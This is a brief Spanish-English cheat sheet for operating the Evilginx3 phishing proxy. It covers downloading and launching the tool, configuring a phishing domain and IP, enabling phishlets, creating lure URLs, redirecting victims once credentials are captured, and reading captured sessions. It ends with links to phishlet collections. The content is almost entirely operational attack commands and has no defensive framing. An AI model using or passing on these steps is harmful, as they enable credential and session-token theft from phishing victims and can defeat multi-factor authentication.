# Evilginx3

## Oneliners

### Download

```bash
wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
```

### Ejecutar

> Lanzar siempre sobre tmux para seguir ejecutando al finalizar conexion ssh

```bash
sudo ./evilginx -p ../phishlets
sudo ./evilginx -p ../phishlets -developer # para dev local
```

### Configs

> Now if you're not running a local development instance (started with -developer command line argument), Evilginx will start to automatically obtain the required TLS certificates from LetsEncrypt.

```bash
# Set up a domain
config domain <domain.com>
config ipv4 <public ip>
# Set up a phishlet
phishlets hostname <phishlet name> <domain.com>
phishlets enable <phishlet name>
phishlets disable <phishlet name> #deshabilitar
# Set up a lure
lures create <phishlet name>
lures get-url <id lure>
lures edit 0 redirect_url https://www.alux.cc # redirigir despues de obtener creds
# Get sessions
sessions
sessions <id session>
```

## Phishlets

Descargar los phishlets y moverlos a la carpeta de phishlets

- https://github.com/An0nUD4Y/Evilginx2-Phishlets
- https://github.com/simplerhacking/Evilginx3-Phishlets
- https://github.com/hash3liZer/phishlets
- https://github.com/ArchonLabs/evilginx2-phishlets
- https://github.com/charlesbel/Evilginx2-Phishlets
